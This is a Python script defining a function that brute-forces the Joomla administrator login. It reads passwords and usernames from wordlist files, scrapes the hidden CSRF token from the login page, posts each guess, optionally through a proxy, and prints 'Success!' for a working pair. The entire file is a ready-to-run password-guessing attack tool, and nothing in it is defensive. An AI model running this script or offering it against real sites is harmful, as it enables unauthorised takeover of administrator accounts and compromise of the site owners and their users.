#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from rich import print

def joomla_brute(url: str, wordlist: str, username: str = None, userlist: str = None, proxy: str = None, verbose: bool = False):
    """
    Perform Joomla login bruteforce attack
    
    Args:
        url (str): Joomla site URL
        wordlist (str): Path to wordlist file
        username (str, optional): Single username to try
        userlist (str, optional): Path to username list file
        proxy (str, optional): Proxy URL (e.g. http://127.0.0.1:8080)
        verbose (bool, optional): Show verbose output
    """
    if not username and not userlist:
        raise ValueError("Either username or userlist must be provided")
    if username and userlist:
        raise ValueError("Cannot use both username and userlist")

    proxy_dict = None
    if proxy:
        parsed_proxy_url = urlparse(proxy)
        proxy_dict = {parsed_proxy_url[0]: parsed_proxy_url[1]}

    admin_url = f"{url}/administrator/"
    ret = 'aW5kZXgucGhw'
    option = 'com_login'
    task = 'login'
    
    try:
        initial_req = requests.session().get(admin_url)
        if initial_req.status_code != 200:
            print(f"[yellow]Warning: Initial request returned status code {initial_req.status_code}[/yellow]")
        cookies = initial_req.cookies.get_dict()
    except requests.RequestException as e:
        print(f"[red]Error: Could not connect to {admin_url}: {str(e)}[/red]")
        return False

    def get_data(path):
        with open(path, 'rb+') as f:
            data = [line.rstrip() for line in f]
        return data

    def try_login(current_username):
        for password in get_data(wordlist):
            headers = {'User-Agent': 'nano'}

            try:
                r = requests.get(admin_url, proxies=proxy_dict, cookies=cookies, headers=headers)
                if r.status_code != 200:
                    print(f"[yellow]Warning: GET request returned status code {r.status_code}[/yellow]")
                    continue
                    
                soup = BeautifulSoup(r.text, 'html.parser')
                longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
                password = password.decode('utf-8')

                data = {
                    'username': current_username,
                    'passwd': password,
                    'option': option,
                    'task': task,
                    'return': ret,
                    longstring: 1
                }
                
                r = requests.post(admin_url, data=data, proxies=proxy_dict, cookies=cookies, headers=headers)
                if r.status_code != 200:
                    print(f"[yellow]Warning: POST request returned status code {r.status_code}[/yellow]")
                    continue
                    
                soup = BeautifulSoup(r.text, 'html.parser')
                response = soup.find('div', {'class': 'alert-message'})
                
                if response:
                    if verbose:
                        print(f"[red]Failed: {current_username}:{password}[/red]")
                else:
                    print(f"[green]Success! {current_username}:{password}[/green]")
                    return True
            except requests.RequestException as e:
                print(f"[red]Error during request: {str(e)}[/red]")
                continue
        return False

    if userlist:
        for user in get_data(userlist):
            try_login(user.decode('utf-8'))
    else:
        try_login(username) 